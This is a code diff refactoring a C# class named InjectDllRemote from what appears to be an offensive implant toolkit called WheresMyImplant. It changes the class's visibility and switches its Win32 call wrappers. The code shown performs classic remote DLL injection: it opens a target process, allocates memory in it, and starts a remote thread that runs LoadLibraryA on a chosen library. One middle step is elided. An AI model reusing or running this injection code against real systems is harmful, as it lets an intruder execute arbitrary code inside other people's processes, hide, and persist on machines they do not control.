@@ -1,24 +1,26 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
+using Unmanaged;
+
 namespace WheresMyImplant
 {
-    public class InjectDllRemote : Base
+    internal class InjectDllRemote : Base
     {
-        public InjectDllRemote(string library, UInt32 processId)
+        internal InjectDllRemote(string library, UInt32 processId)
         {
             ////////////////////////////////////////////////////////////////////////////////
             WriteOutput("Attempting to get handle on " + processId);
-            IntPtr hProcess = Unmanaged.OpenProcess(Unmanaged.PROCESS_CREATE_THREAD | Unmanaged.PROCESS_QUERY_INFORMATION | Unmanaged.PROCESS_VM_OPERATION | Unmanaged.PROCESS_VM_WRITE | Unmanaged.PROCESS_VM_READ, false, processId);
+            IntPtr hProcess = kernel32.OpenProcess(kernel32.PROCESS_CREATE_THREAD | kernel32.PROCESS_QUERY_INFORMATION | kernel32.PROCESS_VM_OPERATION | kernel32.PROCESS_VM_WRITE | kernel32.PROCESS_VM_READ, false, processId);
             WriteOutput("Handle: " + hProcess);
-            IntPtr hmodule = Unmanaged.GetModuleHandle("kernel32.dll");
-            IntPtr loadLibraryAddr = Unmanaged.GetProcAddress(hmodule, "LoadLibraryA");
+            IntPtr hmodule = kernel32.GetModuleHandle("kernel32.dll");
+            IntPtr loadLibraryAddr = kernel32.GetProcAddress(hmodule, "LoadLibraryA");
 
             ////////////////////////////////////////////////////////////////////////////////
             IntPtr lpAddress = IntPtr.Zero;
             UInt32 dwSize = (UInt32)((library.Length + 1) * Marshal.SizeOf(typeof(char)));
             WriteOutputNeutral("Attempting to allocate memory");
-            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, Unmanaged.MEM_COMMIT | Unmanaged.MEM_RESERVE, Winnt.PAGE_READWRITE);
+            IntPtr lpBaseAddress = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, kernel32.MEM_COMMIT | kernel32.MEM_RESERVE, Winnt.PAGE_READWRITE);
             WriteOutputGood("Allocated " + dwSize + " bytes at " + lpBaseAddress.ToString("X4"));
             WriteOutputGood("Memory Protection Set to PAGE_READWRITE");
 
@@ -42,11 +44,11 @@ namespace WheresMyImplant
             UInt32 dwCreationFlags = 0;
             UInt32 threadId = 0;
             WriteOutputNeutral("Attempting to start remote thread");
-            IntPtr hThread = Unmanaged.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
+            IntPtr hThread = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, loadLibraryAddr, lpBaseAddress, dwCreationFlags, ref threadId);
             WriteOutputGood("Started Thread: " + hThread);
 
             ///////////////////////////////////////////////////////////////////////////////
-            Unmanaged.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
+            kernel32.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
         }
     }
 }
